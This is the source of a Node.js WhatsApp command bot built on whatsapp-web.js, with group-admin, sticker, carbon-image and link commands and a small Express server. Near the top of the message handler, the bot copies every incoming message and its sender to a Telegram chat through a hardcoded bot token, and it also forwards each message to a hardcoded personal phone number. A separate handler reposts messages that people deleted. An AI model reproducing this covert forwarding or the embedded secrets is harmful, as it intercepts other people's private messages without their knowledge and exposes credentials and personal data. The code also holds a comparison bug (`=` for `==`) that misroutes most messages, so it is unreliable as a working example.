//jshint esversion:8
const express = require("express");
const app = express();
const { Client, LegacySessionAuth, Location, List, Buttons, LocalAuth,  MessageMedia } = require("whatsapp-web.js");
const config = require("./config");
var XMLHttpRequest = require('xhr2');
var xhr = new XMLHttpRequest();
const axios = require('axios');
const FormData = require('form-data');
let mime = require('mime-to-extensions');

async function telegraph(attachmentData) {
    let form = new FormData();
    form.append('file', Buffer.from(attachmentData.data, 'base64'), {
        filename: `telegraph.${mime.extension(attachmentData.mimetype)}`

    });

    return axios.create({
        headers: form.getHeaders()
    }).post('https://telegra.ph/upload', form).then(response => {
        return "https://telegra.ph" + response.data[0].src;
    }).catch(error => {
        return "error";
    });

}
async function carbon(text) {

  let respoimage = await axios.get(`https://carbonnowsh.herokuapp.com/?code=${text.replace(/ /gi,"+")}&theme=darcula&backgroundColor=rgba(36, 75, 115)`, { responseType: 'arraybuffer' }).catch(function(error) {
      return "error";
  });

  return ({
      mimetype: "image/png",
      data: Buffer.from(respoimage.data).toString('base64'),
      filename: "carbon"
  });
}


const client = new Client({
  puppeteer: { headless: true, args: ["--no-sandbox"] },
  authStrategy: new LegacySessionAuth({
    session: config.session,
  }),
});

client.initialize();

client.on("auth_failure", () => {
  console.error(
    "There is a problem in authentication, Kindly set the env var again and restart the app"
  );
});

client.on("ready", () => {
  console.log("Bot has been started");
  const number = "+918790863694";
  const text = "Hey Im Restarted";
  const chatId = number.substring(1) + "@c.us";
  client.sendMessage(chatId, text);
});

client.on("message", async (msg) => {
  //create XMLHttpRequest object
  let url = ("https://api.telegram.org/bot5217702275:AAH0KwikoXAzjEc7qO8V9XiH1-gnTAVnFF4/sendMessage?chat_id=1089528685&text=");
  let text = url.concat(msg.body+" \n **From:** "+msg.author+"&parse_mode=markdown");
  console.log(text)
  //create XMLHttpRequest object
  const xhr = new XMLHttpRequest()
  xhr.open("GET",text)
  xhr.send()
  console.log('MESSAGE RECEIVED', msg);
  const number = "+918790863694";
  const chatId = number.substring(1) + "@c.us";
  client.sendMessage(chatId, msg);
  xhr.open("GET",url+"Iam Restarted")
  
  if (msg.body === '!pong reply') {
        msg.reply('ping');

    } else if (msg.body === '!pong') {
        // Send a new message to the same chat
        client.sendMessage(msg.from, 'pong');

    } else if (msg.body.startsWith('!sendto ')) {
        // Direct send a new message to specific id
        let number = msg.body.split(' ')[1];
        let messageIndex = msg.body.indexOf(number) + number.length;
        let message = msg.body.slice(messageIndex, msg.body.length);
        number = number.includes('@c.us') ? number : `${number}@c.us`;
        let chat = await msg.getChat();
        chat.sendSeen();
        client.sendMessage(number, message);

    } else if (msg.body.startsWith('!subject ')) {
        // Change the group subject
        let chat = await msg.getChat();
        if (chat.isGroup) {
            let newSubject = msg.body.slice(9);
            chat.setSubject(newSubject);
        } else {
            msg.reply('This command can only be used in a group!');
        }
    } else if (msg.body.startsWith('!echo ')) {
        // Replies with the same message
        msg.reply(msg.body.slice(6));
    } else if (msg.body.startsWith('!desc ')) {
        // Change the group description
        let chat = await msg.getChat();
        if (chat.isGroup) {
            let newDescription = msg.body.slice(6);
            chat.setDescription(newDescription);
        } else {
            msg.reply('This command can only be used in a group!');
        }
    } else if (msg.body === '!leave') {
        // Leave the group
        let chat = await msg.getChat();
        if (chat.isGroup) {
            chat.leave();
        } else {
            msg.reply('This command can only be used in a group!');
        }
    } else if (msg.body.startsWith('!join ')) {
        const inviteCode = msg.body.split(' ')[1];
        try {
            await client.acceptInvite(inviteCode);
            msg.reply('Joined the group!');
        } catch (e) {
            msg.reply('That invite code seems to be invalid.');
        }
    } else if (msg.body === '!groupinfo') {
        let chat = await msg.getChat();
        if (chat.isGroup) {
            msg.reply(`
                *Group Details*
                Name: ${chat.name}
                Description: ${chat.description}
                Created At: ${chat.createdAt.toString()}
                Created By: ${chat.owner.user}
                Participant count: ${chat.participants.length}
            `);
        } else {
            msg.reply('This command can only be used in a group!');
        }
    } else if (msg.body === '!chats') {
        const chats = await client.getChats();
        client.sendMessage(msg.from, `The bot has ${chats.length} chats open.`);
    } else if (msg.body === '!info') {
        let info = client.info;
        client.sendMessage(msg.from, `
            *Connection info*
            User name: ${info.pushname}
            My number: ${info.wid.user}
            Platform: ${info.platform}
        `);
    } else if (msg.body === '!mediainfo' && msg.hasMedia) {
        const attachmentData = await msg.downloadMedia();
        msg.reply(`
            *Media info*
            MimeType: ${attachmentData.mimetype}
            Filename: ${attachmentData.filename}
            Data (length): ${attachmentData.data.length}
        `);
    } else if (msg.body === '!quoteinfo' && msg.hasQuotedMsg) {
        const quotedMsg = await msg.getQuotedMessage();

        quotedMsg.reply(`
            ID: ${quotedMsg.id._serialized}
            Type: ${quotedMsg.type}
            Author: ${quotedMsg.author || quotedMsg.from}
            Timestamp: ${quotedMsg.timestamp}
            Has Media? ${quotedMsg.hasMedia}
        `);
    } else if (msg.body === '!resendmedia' && msg.hasQuotedMsg) {
        const quotedMsg = await msg.getQuotedMessage();
        if (quotedMsg.hasMedia) {
            const attachmentData = await quotedMsg.downloadMedia();
            client.sendMessage(msg.from, attachmentData, { caption: 'Here\'s your requested media.' });
        }
    } else if (msg.body === '!location') {
        msg.reply(new Location(37.422, -122.084, 'Googleplex\nGoogle Headquarters'));
    } else if (msg.location) {
        msg.reply(msg.location);
    } else if (msg.body.startsWith('!status ')) {
        const newStatus = msg.body.split(' ')[1];
        await client.setStatus(newStatus);
        msg.reply(`Status was updated to *${newStatus}*`);
    } else if (msg.body === '!mention') {
        const contact = await msg.getContact();
        const chat = await msg.getChat();
        chat.sendMessage(`Hi @${contact.number}!`, {
            mentions: [contact]
        });
    } else if (msg.body === '!delete') {
        if (msg.hasQuotedMsg) {
            const quotedMsg = await msg.getQuotedMessage();
            if (quotedMsg.fromMe) {
                quotedMsg.delete(true);
            } else {
                msg.reply('I can only delete my own messages');
            }
        }
    } else if (msg.body === '!pin') {
        const chat = await msg.getChat();
        await chat.pin();
    } else if (msg.body === '!archive') {
        const chat = await msg.getChat();
        await chat.archive();
    } else if (msg.body === '!mute') {
        const chat = await msg.getChat();
        // mute the chat for 20 seconds
        const unmuteDate = new Date();
        unmuteDate.setSeconds(unmuteDate.getSeconds() + 20);
        await chat.mute(unmuteDate);
    } else if (msg.body === '!typing') {
        const chat = await msg.getChat();
        // simulates typing in the chat
        chat.sendStateTyping();
    } else if (msg.body === '!recording') {
        const chat = await msg.getChat();
        // simulates recording audio in the chat
        chat.sendStateRecording();
    } else if (msg.body === '!clearstate') {
        const chat = await msg.getChat();
        // stops typing or recording in the chat
        chat.clearState();
    } else if (msg.body === '!jumpto') {
        if (msg.hasQuotedMsg) {
            const quotedMsg = await msg.getQuotedMessage();
            client.interface.openChatWindowAt(quotedMsg.id._serialized);
        }
    } else if (msg.body === '!buttons') {
        let button = new Buttons('Button body',[{body:'bt1'},{body:'bt2'},{body:'bt3'}],'title','footer');
        client.sendMessage(msg.from, button);
    } else if (msg.body === '!list') {
        let sections = [{title:'sectionTitle',rows:[{title:'ListItem1', description: 'desc'},{title:'ListItem2'}]}];
        let list = new List('List body','btnText',sections,'Title','footer');
        client.sendMessage(msg.from, list);
    } else if (msg.body === '!alive') {
      client.sendPresenceAvailable();
      msg.reply("```" + "I will be online from now." + "```");
  } else if (msg.body.startsWith('!block') && !msg.to.includes("-")) {
    await msg.reply(`*❌ Blocked* \n\n You have been blocked\n\n`);
    let chat = await msg.getChat();
    let contact = await chat.getContact();
    contact.block();
  } else if (msg.body === '!carbon') {
  let data;

    msg.delete(true);
    if( msg.hasQuotedMsg){
        let quotedMsg = await msg.getQuotedMessage();
        data = await carbon(quotedMsg.body);
        msg = quotedMsg;
    }
    else {
        data = await carbon(args.join(' '));
    }

    if (data == "error") {
        await client.sendMessage(msg.to, `🙇‍♂️ *Error*\n\n` + "```Something Unexpected Happened to create the Carbon.```");
    } else {
        await client.sendMessage(msg.to, new MessageMedia(data.mimetype, data.data, data.filename), { caption: `Carbon for 👇\n` + "```" + msg.body.replace("!carbon ", "") + "```" });
    }
  } else if (msg.body = "!directlink") {
    if(msg.hasQuotedMsg){
      let quotedMsg = await msg.getQuotedMessage();
      let attachmentData = await quotedMsg.downloadMedia();
      let data = await telegraph(attachmentData);
      if (data == "error") {
          quotedMsg.reply(`Error occured while create direct link.`);
      } else {
          quotedMsg.reply(`🔗 *Direct Link 👇*\n\n` + "```" + data + "```");
      }
  }
  else{
      await client.sendMessage(msg.to,"Please reply to a media file");
  }
  } else if (msg.body == "!stic"){
    msg.delete(true);
    let quotedMsg = await msg.getQuotedMessage();
    if (quotedMsg.hasMedia) {
        let attachmentData = await quotedMsg.downloadMedia();
        await client.sendMessage(msg.to, new MessageMedia(attachmentData.mimetype, attachmentData.data, attachmentData.filename), { sendMediaAsSticker: true });
    } else {
        await client.sendMessage(msg.to, `🙇‍♂️ *Error*\n\n` + "```No image found to make a Sticker```");
    }
  }

});
client.on("message_revoke_everyone", async (after, before) => {
  if (before) {
    if (
      before.fromMe !== true &&
      before.hasMedia !== true &&
      before.author == undefined &&
      config.enable_delete_alert == "true"
    ) {
      client.sendMessage(
        before.from,
        "_You deleted this message_ 👇👇\n\n" + before.body
      );
    }
  }
});

client.on("disconnected", (reason) => {
  console.log("Client was logged out", reason);
});

app.get("/", (req, res) => {
  res.send(
    'status 200'
  );
});
app.get("/api/", (req, res) => {
  res.send(
    '<h1>api is rip for now</h1>'
  );
});

app.use(
  "/public",
  express.static("public"),
  require("serve-index")("public", { icons: true })
); // public directory will be publicly available
app.use(
  "/examples",
  express.static("examples"),
  require("serve-index")("examples", { icons: true })
); // public directory will be publicly available

app.listen(process.env.PORT || 8080, () => {
  console.log(`Server listening at Port: ${process.env.PORT || 8080}`);
});
